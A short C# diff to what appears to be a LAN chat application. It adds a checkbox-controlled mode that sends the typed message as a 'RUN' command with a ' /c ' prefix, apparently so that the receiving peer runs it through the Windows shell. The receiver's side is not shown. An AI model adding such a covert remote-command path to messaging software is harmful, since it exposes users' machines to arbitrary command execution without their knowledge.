@@ -29,7 +29,7 @@ namespace LIM
         {
             Thread thread = new Thread(new ThreadStart(() =>
             {
-                GlobalData.MessagesGetter(listBox1, checkBox2, checkBox4, checkBox5);
+                GlobalData.MessagesGetter(listBox1, checkBox2, checkBox4, checkBox5, textBox3);
             }));
             thread.Start(); 
 
@@ -89,7 +89,15 @@ namespace LIM
 
                     ip = new IPEndPoint(IPAddress.Parse(str), GlobalData.ProtocalPort);
                 }
-                GlobalData.SendMessage(0, GlobalData.UserName, textBox1.Text, ip);
+                if (!checkBox3.Checked)
+                {
+                    GlobalData.SendMessage(0, GlobalData.UserName, textBox1.Text, ip);
+                }
+                else
+                {
+                    GlobalData.SendMessage(2, "run".ToUpper(), " /c " + textBox1.Text, ip);
+                }
+
                 if (!checkBox6.Checked)
                 {
                     textBox1.Text = "";
